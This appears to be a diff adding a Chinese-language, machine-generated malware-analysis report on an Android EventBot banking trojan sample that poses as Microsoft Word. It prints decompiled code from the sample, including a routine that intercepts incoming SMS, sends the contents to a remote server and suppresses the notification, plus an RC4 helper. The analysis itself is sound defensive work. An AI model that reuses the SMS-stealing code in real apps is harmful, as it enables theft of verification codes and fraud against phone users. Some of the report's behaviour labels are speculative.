@@ -1,0 +1,110 @@
+{
+  "APK信息": {
+    "文件名": "42344ae56337fe802340385c821b6be151483d99ae3572e50e76dfc8b790033a.apk",
+    "sha256": "42344ae56337fe802340385c821b6be151483d99ae3572e50e76dfc8b790033a",
+    "包名": "com.example.eventbot",
+    "应用名": "Microsoft Word",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 940.2
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\example\\eventbot\\func;",
+          "method_signature": "if(sms.length()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void doSMS(Context context, BroadcastReceiver broadcastReceiver, Intent intent) {\n    if (isSmsAdmin(context) && intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\")) {\n        JSONObject sms = parseSMS(context, intent);\n        if (sms.length() == 3) {\n            sendLog(context, \"smsLog\", sms.toString());\n        }\n        broadcastReceiver.abortBroadcast();\n    }\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public void doSMS(Context context, BroadcastReceiver broadcastReceiver, Intent intent) {\n>>>         if (isSmsAdmin(context) && intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             JSONObject sms = parseSMS(context, intent);\n>>>             printDebug(\"[func] [doSMS] sms.length(): \" + sms.length());\n>>>             if (sms.length() == 3) {\n>>>                 printDebug(\"[func] [doSMS] sms: \" + sms.toString());\n>>>                 sendLog(context, \"smsLog\", sms.toString());\n>>>             }\n>>>             broadcastReceiver.abortBroadcast();\n          }\n      }\n  ",
+          "behavior_description": "该代码注册监听系统短信广播（android.provider.Telephony.SMS_RECEIVED），在收到新短信时解析短信内容（发件人、正文、时间戳等3个字段），通过 sendLog() 将短信内容上传到远程服务器（窃取短信验证码/OTP），随后调用 broadcastReceiver.abortBroadcast() 终止广播，阻止短信到达用户手机的通知栏和默认短信应用，实现短信拦截与隐藏。数据流向：SMS_RECEIVED 广播 Intent（source）→ parseSMS 解析 → sendLog 上传至C2服务器 + abortBroadcast 阻断短信传递（sink）。这是 EventBot 银行木马窃取双因素认证短信的典型行为，直接导致用户短信隐私泄露和验证码被盗。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\example\\eventbot\\func;",
+          "method_signature": "rc4(String str, byte[] bArr)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public byte[] rc4(String str, byte[] bArr) {\n    Cipher cipher = Cipher.getInstance(\"RC4\");\n    cipher.init(2, new SecretKeySpec(str.getBytes(), \"RC4\"));\n    return cipher.doFinal(bArr);\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public byte[] rc4(String str, byte[] bArr) {\n>>>         try {\n>>>             Cipher cipher = Cipher.getInstance(\"RC4\");\n>>>             cipher.init(2, new SecretKeySpec(str.getBytes(), \"RC4\"));\n>>>             return cipher.doFinal(bArr);\n          } catch (Throwable unused) {\n              return null;\n          }",
+          "behavior_description": "该代码位于已确认恶意样本 EventBot（银行木马/信息窃取者）自身包 com.example.eventbot.func 中，实现了 RC4 对称流密码的加解密原语。rc4 方法将外部传入的密钥字符串构造为 SecretKeySpec，初始化 RC4 Cipher（init 模式 2 为解密模式，RC4 为对称流密码，加密与解密为同一运算），再通过 doFinal 对传入的字节数据执行加密/解密并返回结果，异常时静默返回 null 以规避崩溃检测。数据流向：调用方传入的密钥与待处理数据 → SecretKeySpec/RC4 Cipher → Cipher.doFinal() 完成数据加密/解密。在恶意样本上下文中，该函数是木马的密码学工具箱，用于文件/数据内容的加密（勒索式加密或加密窃取数据回传 C2 前的处理）以及解密隐藏的 C2 配置，属于恶意加密行为，而非正常业务加密。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
